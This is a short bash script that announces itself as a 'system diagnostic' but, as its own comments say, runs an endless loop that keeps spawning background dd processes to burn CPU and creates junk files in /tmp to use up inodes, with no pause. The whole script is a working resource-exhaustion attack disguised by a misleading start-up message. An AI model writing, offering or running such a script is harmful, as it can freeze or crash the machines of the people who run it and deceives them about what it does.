#!/bin/bash
# This script looks like a simple background task but is actually an infinite loop 
# that rapidly creates files and consumes CPU.

echo "Starting system diagnostic..."

while true; do
    # Aggressively spawn background jobs that consume CPU
    dd if=/dev/zero of=/dev/null &
    
    # Rapidly create garbage files to exhaust inodes
    touch /tmp/garbage_$(date +%s%N).txt
    
    # Don't sleep, run as fast as possible to overwhelm the system
done
